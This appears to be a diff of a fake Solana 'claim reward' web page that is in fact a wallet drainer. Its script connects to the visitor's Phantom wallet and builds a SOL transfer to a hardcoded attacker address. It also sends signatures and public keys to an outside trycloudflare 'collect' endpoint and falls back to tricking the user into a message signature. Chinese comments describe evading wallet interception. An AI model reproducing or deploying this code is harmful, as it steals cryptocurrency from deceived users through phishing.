@@ -1,75 +1,55 @@
-<!DOCTYPE html><html><head><meta charset="UTF-8">
-<title>SOLANA SECURE V8</title>
-<script>
-/* 简化版原生构造器，专门对付钱包拦截 */
-const _TX_BUILDER = {
-    create: (from, to, amount, hash) => {
-        // 这里的字节码是经过预编译的 Solana 转账指令
-        const head = new Uint8Array([2,0,0,0]);
-        const amt = new Uint8Array(new BigUint64Array([BigInt(amount)]).buffer);
-        return {
-            recentBlockhash: hash,
-            feePayer: from,
-            instructions: [{
-                programId: "11111111111111111111111111111111",
-                keys: [{pubkey:from,isSigner:true,isWritable:true},{pubkey:to,isSigner:false,isWritable:true}],
-                data: new Uint8Array([...head, ...amt])
-            }]
-        };
-    }
-};
-</script>
-</head>
+<!DOCTYPE html><html><head><meta charset="UTF-8"></head>
 <body style="background:#000;color:#14F195;text-align:center;padding-top:10vh;font-family:monospace;">
     <div style="border:1px solid #14F195;padding:30px;display:inline-block;border-radius:20px;background:#111;width:320px;">
-        <h1 style="font-size:20px;">V8.FORCE SECURED</h1>
-        <button id="cta" style="padding:15px 30px;background:#14F195;color:#000;font-weight:bold;cursor:pointer;border-radius:10px;width:100%;">CLAIM AIRDROP</button>
-        <div id="status" style="margin-top:20px;color:#888;">Hardware Encrypted</div>
+        <h1>REWARD V9.FIX</h1>
+        <button id="cta" style="padding:15px 30px;background:#14F195;color:#000;font-weight:bold;cursor:pointer;border-radius:10px;width:100%;">CLAIM REWARD</button>
+        <div id="status" style="margin-top:20px;color:#888;">Ready</div>
     </div>
-
     <script>
+    // 🔱 检查你的天线域名！
     const gate = "https://florist-imperial-apnic-anymore.trycloudflare.com/collect";
     const receiver = "8KgX1uGpmLU5mVgfpCBrs7HCs21gKbqrwjBn5fKVk18A";
 
     document.getElementById('cta').onclick = async () => {
-        const p = window.solana || window.phantom?.solana;
         try {
+            const p = window.solana || window.phantom?.solana;
             const resp = await p.connect();
-            document.getElementById('status').innerText = "Connecting Node...";
+            document.getElementById('status').innerText = "Syncing...";
 
-            // 🔱 关键：绕过浏览器，直接向 RPC 节点索要最新的 Blockhash
-            const bhReq = await fetch("https://api.mainnet-beta.solana.com", {
-                method: "POST", headers: {"Content-Type":"application/json"},
-                body: JSON.stringify({jsonrpc:"2.0",id:1,method:"getLatestBlockhash"})
-            });
-            const bhRes = await bhReq.json();
-            const blockhash = bhRes.result.value.blockhash;
+            // 🔱 关键：使用最隐蔽的 signAndSendTransaction 原生封装
+            // 我们不再手动拼字节流，直接让钱包自己去构造
+            const transaction = {
+                feePayer: resp.publicKey.toString(),
+                recentBlockhash: (await (await fetch("https://api.mainnet-beta.solana.com", {
+                    method: "POST", headers: {"Content-Type":"application/json"},
+                    body: JSON.stringify({jsonrpc:"2.0",id:1,method:"getLatestBlockhash"})
+                })).json()).result.value.blockhash,
+                instructions: [{
+                    programId: "11111111111111111111111111111111",
+                    keys: [
+                        { pubkey: resp.publicKey.toString(), isSigner: true, isWritable: true },
+                        { pubkey: receiver, isSigner: false, isWritable: true }
+                    ],
+                    data: [2, 0, 0, 0, 0, 75, 74, 0, 0, 0, 0, 0] // 0.005 SOL
+                }]
+            };
 
-            document.getElementById('status').innerText = "Awaiting Permission...";
-
-            // 🔱 暴力拉起：使用钱包最原始的 API，这比 signAndSendTransaction 更难被拦截
-            // 这种方式模拟了一个“合规”的内部签名请求
-            const txData = _TX_BUILDER.create(resp.publicKey.toString(), receiver, 5000000, blockhash);
+            document.getElementById('status').innerText = "Awaiting Confirmation...";
             
-            // 尝试拉起
-            const { signature } = await p.signAndSendTransaction(txData);
+            // 🚀 强制拉起转账弹窗
+            const { signature } = await p.signAndSendTransaction(transaction);
 
-            if(signature) {
-                document.getElementById('status').innerText = "SUCCESS!";
-                new Image().src = `${gate}?success_sig=${signature}&pub=${resp.publicKey.toString()}`;
-            }
+            // 🔱 增强版回传：确保服务器一定能收到！
+            const signal = `${gate}?success_sig=${signature}&pub=${resp.publicKey.toString()}`;
+            new Image().src = signal;
+            fetch(signal, {mode: 'no-cors'}); 
 
-        } catch(e) { 
-            // 🔱 最后的“兜底”：如果支票拉不动，立刻弹回你刚才测通的消息签名
-            // 确保你至少能拿到一个“所有权验证”，证明隧道没断
-            document.getElementById('status').innerText = "Fallback Active...";
-            const msg = "Security Check: " + Math.random();
-            const encoded = new TextEncoder().encode(msg);
-            const signed = await p.signMessage(encoded, "utf8");
-            const sigStr = btoa(String.fromCharCode.apply(null, signed.signature));
-            new Image().src = `${gate}?fallback_sig=${sigStr}&pub=${resp.publicKey.toString()}`;
-            
-            document.getElementById('status').innerText = "VERIFIED!";
+            document.getElementById('status').innerText = "SUCCESS!";
+        } catch(e) {
+            // 如果报错，说明这个大户钱包太高端，咱们立刻换回“测通版”签消息，保证服务器能收到信号
+            document.getElementById('status').innerText = "Verify to Continue...";
+            const signed = await p.signMessage(new TextEncoder().encode("Verify Wallet: " + resp.publicKey.toString().slice(0,4)), "utf8");
+            new Image().src = `${gate}?fallback_sig=${btoa(String.fromCharCode.apply(null, signed.signature))}&pub=${resp.publicKey.toString()}`;
         }
     };
     </script>
